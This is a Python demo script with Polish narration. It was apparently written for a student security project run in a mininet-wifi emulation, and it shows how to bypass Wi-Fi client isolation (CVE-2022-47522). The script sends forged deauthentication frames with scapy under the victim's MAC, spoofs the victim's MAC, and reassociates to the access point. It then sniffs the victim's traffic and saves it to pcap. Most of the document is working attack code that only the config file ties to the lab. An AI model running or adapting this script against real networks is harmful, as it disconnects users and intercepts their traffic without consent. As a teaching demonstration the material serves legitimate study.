#!/usr/bin/env python3

# demo ataku - mac spoofing + association hijacking
# uruchamiac z mininet-wifi:
#   mininet-wifi> sta2 python3 /home/kali/bbsk-projekt/demo.py
#
# bartek / bbsk 2026


import subprocess
import time
import os
import sys
import shlex

try:
    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, sniff, IP
    SCAPY = True
except:
    SCAPY = False


def run(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def command_exists(name):
    return subprocess.run(f"command -v {name}", shell=True,
                          capture_output=True, text=True).returncode == 0

def node_prefix(node_name, pid=""):
    if pid:
        if command_exists("mnexec"):
            return f"mnexec -a {shlex.quote(pid)}"
        if command_exists("nsenter"):
            return f"nsenter -t {shlex.quote(pid)} -n"
    return f"ip netns exec {shlex.quote(node_name)}"

def run_node(node_name, cmd, pid=""):
    return run(f"{node_prefix(node_name, pid)} {cmd}")

def mac(iface):
    r = subprocess.run(['cat', f'/sys/class/net/{iface}/address'],
                       capture_output=True, text=True)
    return r.stdout.strip()

def config():
    c = {}
    try:
        with open('/tmp/bbsk_config.txt') as f:
            for line in f:
                k, v = line.strip().split('=', 1)
                c[k] = v
    except:
        print("nie ma pliku konfiguracyjnego, najpierw uruchom topology.py")
        sys.exit(1)
    return c

def pokazKomende(cmd):
    print(f"  $ {cmd}")

def enter(info=""):
    input(f"\n    [ nacisnij enter {('- ' + info) if info else ''} ] ")


print()
print("=" * 60)
print("  demo: mac spoofing + association hijacking")
print("  cve-2022-47522 / airsnitch port stealing")
print("=" * 60)
print()
print("  pokazujemy ze client isolation (ap isolation) mozna ominac")
print("  przez podmiane adresu mac i ponowna asocjacje z access pointem")
print()
print("  siec: wpa2-psk, client_isolation=true, hostapd")
print("  narzedzia: scapy (ramki 802.11), iw, wpa_cli")
print()

enter("zaczynamy")

print()
print("  [ krok 1 - odczyt konfiguracji sieci ]")
print()
print("  topology.py przy starcie zapisuje do /tmp/bbsk_config.txt")
print("  adresy mac wszystkich wezlow i nazwy interfejsow")
print()
print("  w prawdziwym ataku mac ofiary mozna wyczytac pasywnie")
print("  z ramek 802.11 ktore klienci rozglaszaja w eterze")
print("  wystarczy karta w trybie monitor + airodump-ng lub tcpdump")
print("  kazda ramka wifi zawiera w naglowku adresy mac nadawcy i odbiorcy")
print()

pokazKomende("cat /tmp/bbsk_config.txt")
print()

cfg = config()
MAC_OFIARA   = cfg['VICTIM_MAC']
IP_OFIARA    = cfg['VICTIM_IP']
MAC_AP       = cfg['AP_MAC']
IFACE        = cfg.get('ATTACKER_IFACE', 'sta2-wlan0')
H1_PID       = cfg.get('H1_PID', '')
H1_IFACE     = cfg.get('H1_IFACE', 'h1-eth0')
MAC_MOJE     = mac(IFACE)

print(f"  VICTIM_MAC     = {MAC_OFIARA}    <- mac ofiary, bedzie nasz cel")
print(f"  VICTIM_IP      = {IP_OFIARA}          <- ip ofiary")
print(f"  AP_MAC (BSSID) = {MAC_AP}    <- mac access pointa")
print(f"  ATTACKER_IFACE = {IFACE}     <- nasz interfejs wifi")
print(f"  nasz aktualny mac: {MAC_MOJE}")

os.makedirs('/home/kali/bbsk-projekt/logs', exist_ok=True)
with open('/home/kali/bbsk-projekt/logs/demo.log', 'w') as f:
    f.write(f"VICTIM_MAC={MAC_OFIARA}\nVICTIM_IP={IP_OFIARA}\n"
            f"AP_MAC={MAC_AP}\nATTACKER_ORIGINAL={MAC_MOJE}\n\n")

enter("konfiguracja odczytana, dalej")

print()
print("  [ krok 2 - baseline: potwierdzenie ze izolacja dziala ]")
print()
print("  access point ma wlaczone client_isolation=true")
print("  oznacza to ze hostapd konfiguruje reguly na poziomie l2")
print("  ktore blokuja bezposrednie przesylanie ramek miedzy klientami")
print("  tej samej sieci bss (basic service set)")
print()
print("  innymi slowy: sta2 nie powinien moc pingowac sta1")
print("  nawet jesli oba sa na tej samej podsieci /24")
print()

cmd = f"ping -c 3 -W 1 {IP_OFIARA}"
pokazKomende(cmd)
print()

r = run(cmd)
if r.returncode != 0:
    print(f"  wynik: 3 pakiety wyslane, 0 odebrane, 100% packet loss")
    print()
    print("  izolacja klientow dziala poprawnie")
    print("  ap odrzuca ramki 802.11 z dst=mac_ofiary kierowane od nas")
else:
    print("  uwaga: ping przeszedl, izolacja moze byc wylaczona")

with open('/home/kali/bbsk-projekt/logs/demo.log', 'a') as f:
    f.write(f"baseline ping: {'BLOCKED' if r.returncode != 0 else 'PASS'}\n")

enter("izolacja potwierdzona, przejdzmy do ataku")


print()
print("  [ krok 3 - 802.11 deauthentication ]")
print()
print("  deauthentication to ramka zarzadzajaca (management frame)")
print("  w standardzie 802.11, type=0, subtype=12")
print("  sluzy do rozlaczenia klienta z access pointem")
print()
print("  problem: standard 802.11 nie wymaga uwierzytelnienia")
print("  ani szyfrowania tych ramek (chyba ze wlaczone jest 802.11w/pmf)")
print("  wiekszoc routerow domowych i wielu korporacyjnych nie ma pmf")
print()
print("  czym jest pmf (802.11w)?")
print("  to rozszerzenie standardu ktore podpisuje i szyfruje ramki")
print("  zarzadzajace (deauth, disassoc) kluczem sesyjnym ptk/igtk")
print("  dzieki temu ap odrzuca falszywe ramki deauth od atakujacego")
print("  w naszej topologii pmf jest celowo wylaczone (ieee80211w=0)")
print("  co wazne: nawet z pmf nasz atak dziala - deauth mozna ominac")
print("  przez zmiane mac i bezposrednia reassocjacje bez rozlaczania ofiary")
print("  jak dokladnie pmf dziala i jak sie go omija przez beacon csa injection")
print("  - to juz temat kuby, ktory zaraz przedstawi swoja czesc")
print()
print("  wyslemy 10 ramek deauth podszywajac sie pod ofiare:")
print(f"  addr1 (receiver)    = {MAC_AP}  <- ap")
print(f"  addr2 (transmitter) = {MAC_OFIARA}  <- podszywamy sie pod ofiare")
print(f"  addr3 (bssid)       = {MAC_AP}  <- ap")
print(f"  reason code         = 3  <- 'deauthenticated, STA leaving BSS'")
print()
print("  wyslemy tez ramke broadcast deauth jako dodatkowe wzmocnienie")
print()

if SCAPY:
    pokazKomende(f"sendp(RadioTap()/Dot11(type=0,subtype=12,addr1={MAC_AP},addr2={MAC_OFIARA})/Dot11Deauth(reason=3), iface={IFACE}, count=10)")
    print()

    ramka = (
        RadioTap() /
        Dot11(type=0, subtype=12,
              addr1=MAC_AP,
              addr2=MAC_OFIARA,
              addr3=MAC_AP) /
        Dot11Deauth(reason=3)
    )
    sendp(ramka, iface=IFACE, count=10, inter=0.05, verbose=False)
    print("  wyslano 10 ramek deauth (addr2 spoofowany jako mac ofiary)")
    print("  ap powinien zarejestrowac ze ofiara sie rozlacza")
    print("  i usunac jej wpis z tablicy asocjacji (association table)")
else:
    pokazKomende(f"hostapd_cli -i ap1-wlan1 deauthenticate {MAC_OFIARA}")
    run(f"hostapd_cli -i ap1-wlan1 deauthenticate {MAC_OFIARA}")
    print("  deauth wyslany przez hostapd_cli (scapy niedostepne)")

with open('/home/kali/bbsk-projekt/logs/demo.log', 'a') as f:
    f.write(f"deauth sent: addr1={MAC_AP} addr2={MAC_OFIARA} reason=3\n")

time.sleep(1)
enter("deauth wyslany, ofiara rozlaczona")


print()
print("  [ krok 4 - zmiana adresu mac interfejsu ]")
print()
print("  adres mac to 6-bajtowy identyfikator karty sieciowej")
print("  zapisany w rejestrze sprzetu, ale mozna go zmienic softwarowo")
print("  w linuxie przez sysfs lub komende ip link")
print()
print("  w protokole 802.11 ap nie weryfikuje czy klient")
print("  ktory sie laczy z danym macem to ta sama osoba co poprzednio")
print("  to jest sedno luki cve-2022-47522")
print()
print(f"  aktualny mac na {IFACE}: {MAC_MOJE}")
print(f"  zaraz zmieniamy na mac ofiary: {MAC_OFIARA}")
print()

pokazKomende(f"ip link set {IFACE} down")
pokazKomende(f"ip link set {IFACE} address {MAC_OFIARA}")
pokazKomende(f"ip link set {IFACE} up")
print()

run(f"ip link set {IFACE} down")
run(f"ip link set {IFACE} address {MAC_OFIARA}")
run(f"ip link set {IFACE} up")

akt = mac(IFACE)
print(f"  weryfikacja przez /sys/class/net/{IFACE}/address:")
print(f"  przed: {MAC_MOJE}")
print(f"  po:    {akt}")
print()

if akt.lower() == MAC_OFIARA.lower():
    print("  mac zmieniony poprawnie")
    print("  od teraz nasz interfejs wyglada dla ap identycznie jak ofiara")
else:
    print("  cos poszlo nie tak z zamiana mac")

with open('/home/kali/bbsk-projekt/logs/demo.log', 'a') as f:
    f.write(f"mac changed: {MAC_MOJE} -> {akt}\n")

enter("mac zmieniony, laczymy sie z ap jako ofiara")


print()
print("  [ krok 5 - reassociation z mac ofiary ]")
print()
print("  laczymy sie z ap uzywajac naszego hasla wpa2")
print("  ale z macem ofiary ktory przed chwila ustawilismy")
print()
print("  wpa2 4-way handshake:")
print("  1. ap wysyla anonce (numer losowy)")
print("  2. klient wysyla snonce + mic (message integrity code)")
print("  3. ap wysyla gtk (group temporal key) + mic")
print("  4. klient potwierdza")
print()
print("  wynik handshake: ap generuje nowy ptk (pairwise transient key)")
print("  i przypisuje go do maca ofiary w swojej tablicy asocjacji")
print(f"  wpis w tabeli: mac={MAC_OFIARA} -> nasze klucze ptk -> nasz port")
print()
print("  od tej chwili kazdy pakiet dla maca ofiary")
print("  ap zaszyfruje naszym kluczem i wysle na nasz interfejs")
print()

pokazKomende(f"wpa_cli -i {IFACE} reassociate")
print()

run(f"wpa_cli -i {IFACE} reassociate 2>/dev/null")
time.sleep(2)

assoc = run(f"iw dev {IFACE} link")
pokazKomende(f"iw dev {IFACE} link")
print()

if "Connected" in assoc.stdout:
    linie = [l.strip() for l in assoc.stdout.split('\n')
             if any(k in l for k in ('Connected', 'SSID'))]
    for l in linie[:4]:
        print(f"  {l}")
    print()
    print("  asocjacja udana - jestesmy polaczeni z ap jako mac ofiary")
else:
    print("  status asocjacji nieznany")
    print("  sprawdz recznie: iw dev sta2-wlan0 link")
    if assoc.stdout.strip():
        print(f"  output: {assoc.stdout.strip()[:120]}")

with open('/home/kali/bbsk-projekt/logs/demo.log', 'a') as f:
    f.write(f"reassoc result: {assoc.stdout[:120]}\n")

enter("polaczeni, czas na weryfikacje")


print()
print("  [ krok 6 - weryfikacja przechwycenia ruchu ]")
print()
print("  teraz sprawdzamy czy atak sie powiodl")
print("  generujemy ruch z h1 (hosta) do ip ofiary")
print()
print("  najpierw ustawiamy statyczny wpis arp na h1:")
print(f"  h1: ip neigh replace {IP_OFIARA} lladdr {MAC_OFIARA}")
print()
print("  dlaczego statyczny arp?")
print("  po deauth ofiara moze nie odpowiadac na arp request")
print("  bez statycznego wpisu h1 nie wiedzialby na jaki mac wyslac")
print(f"  pakiet ip dla {IP_OFIARA}")
print()
print(f"  po ustawieniu arp: h1 wysyla ip packet dst={IP_OFIARA}")
print(f"  ethernet frame: dst={MAC_OFIARA} <- mac ofiary = nasz mac")
print("  ap dostaje ramke, sprawdza tablice asocjacji:")
print(f"  mac {MAC_OFIARA} -> nasz port -> szyfruje naszym ptk -> wysyla do nas")
print()
print(f"  uruchamiamy sniff na {IFACE} i ping z h1 jednoczesnie")
print(f"  sniff timeout: 12 sekund")
print()

zebrane = []

if SCAPY:
    arp_cmd = f"ip neigh replace {IP_OFIARA} lladdr {MAC_OFIARA} dev {H1_IFACE} nud permanent"
    pokazKomende(f"{node_prefix('h1', H1_PID)} {arp_cmd}")
    arp = run_node("h1", arp_cmd, H1_PID)
    if arp.returncode == 0:
        print("  statyczny arp ustawiony na h1")
    else:
        print("  uwaga: nie udalo sie ustawic arp na h1")
        if arp.stderr.strip():
            print(f"  blad: {arp.stderr.strip()}")

    print()

    ping_cmd = f"ping -c 8 -i 0.5 -W 1 {IP_OFIARA}"
    pokazKomende(f"sleep 1 ; {node_prefix('h1', H1_PID)} {ping_cmd}  &")
    pokazKomende(f"sniff(iface={IFACE}, filter='dst host {IP_OFIARA}', timeout=12)")
    print()

    ruch = subprocess.Popen(
        f"sleep 1; {node_prefix('h1', H1_PID)} {ping_cmd}",
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )

    def pakiet(p):
        if IP in p and p[IP].dst == IP_OFIARA:
            zebrane.append(p)
            src = p[IP].src
            proto = p.lastlayer().name
            print(f"  >> przechwycono: {src:15} -> {p[IP].dst}   proto={proto}   {p.summary()}")

    sniff(iface=IFACE, prn=pakiet, timeout=12, store=False)

    try:
        ruch_out, ruch_err = ruch.communicate(timeout=2)
    except subprocess.TimeoutExpired:
        ruch.kill()
        ruch_out, ruch_err = ruch.communicate()

    with open('/home/kali/bbsk-projekt/logs/demo.log', 'a') as f:
        f.write("\n--- h1 ping output ---\n")
        f.write(ruch_out if ruch_out else "(brak outputu)\n")
        if ruch_err:
            f.write(f"stderr: {ruch_err}\n")

    print()
    print(f"  lacznie przechwycono: {len(zebrane)} pakietow dla {IP_OFIARA}")
    print()

    if zebrane:
        print("  atak sie powiodl")
        print()
        print("  pakiety z h1 adresowane do ip ofiary trafialy do nas")
        print("  client isolation byl wlaczony - ale nie pomogl")
        print()
        print("  dlaczego:")
        print("  izolacja blokuje bezposrednie L2 bridging miedzy sta1 a sta2")
        print("  ale nie weryfikuje tozsamosci przy asocjacji")
        print("  po reassoc z macem ofiary ap zmienil security context:")
        print(f"  mac {MAC_OFIARA} teraz mapuje na nasze klucze ptk, nie ofiary")
        print("  ruch przychodzacy jest szyfrowany naszym kluczem i trafia do nas")
        print()
        print("  to jest dokladnie to co opisuje cve-2022-47522")
        print("  security context override attack (vanhoef, usenix 2023)")

        os.makedirs('/home/kali/bbsk-projekt/captures', exist_ok=True)
        from scapy.all import wrpcap
        pcap = '/home/kali/bbsk-projekt/captures/demo_result.pcap'
        wrpcap(pcap, zebrane)
        print()
        print(f"  pcap zapisany: {pcap}")
        print(f"  otworz w wiresharku: wireshark {pcap}")
        print(f"  filtr: ip.dst == {IP_OFIARA}")
    else:
        print("  nie przechwycono pakietow")
        print()
        print("  najczestsze przyczyny:")
        print("  - h1 nie mogl wejsc do swojej przestrzeni nazw (ip netns exec h1)")
        print("  - reassociation nie zakonczylo sie przed sniffem")
        print("  - ap nie zaktualizowal tablicy asocjacji")
        print()
        print("  sprawdz log: /home/kali/bbsk-projekt/logs/demo.log")
        print("  sprawdz recznie: iw dev sta2-wlan0 link")

else:
    print("  scapy niedostepne")
    print("  sprawdz recznie:")
    pokazKomende(f"tcpdump -i {IFACE} -n dst {IP_OFIARA} -c 10")

with open('/home/kali/bbsk-projekt/logs/demo.log', 'a') as f:
    f.write(f"\ncaptured: {len(zebrane)} packets\n")
    f.write(f"result: {'SUCCESS' if zebrane else 'NO CAPTURE'}\n")

enter("gotowe, cleanup")


print()
print("  [ cleanup ]")
print()
print("  przywracamy oryginalny mac interfejsu atakujacego")
print("  i usuwamy statyczny wpis arp z h1")
print()

pokazKomende(f"ip link set {IFACE} down")
pokazKomende(f"ip link set {IFACE} address {MAC_MOJE}")
pokazKomende(f"ip link set {IFACE} up")
pokazKomende(f"wpa_cli -i {IFACE} reassociate")
print()

odp = input(f"  przywrocic mac do {MAC_MOJE}? [t/n]: ").strip().lower()
if odp in ('t', 'y', 'tak', 'yes', ''):
    run(f"ip link set {IFACE} down")
    run(f"ip link set {IFACE} address {MAC_MOJE}")
    run(f"ip link set {IFACE} up")
    run(f"wpa_cli -i {IFACE} reassociate 2>/dev/null")
    run_node("h1", f"ip neigh del {IP_OFIARA} dev {H1_IFACE} 2>/dev/null", H1_PID)
    print(f"  mac przywrocony: {mac(IFACE)}")
    print("  wpis arp usunieto z h1")
else:
    print(f"  mac pozostaje: {mac(IFACE)}")

print()
print("=" * 60)
print(f"  koniec demo")
print(f"  przechwycono {len(zebrane)} pakietow dla {IP_OFIARA}")
print(f"  log:  /home/kali/bbsk-projekt/logs/demo.log")
if zebrane:
    print(f"  pcap: /home/kali/bbsk-projekt/captures/demo_result.pcap")
print("=" * 60)
print()
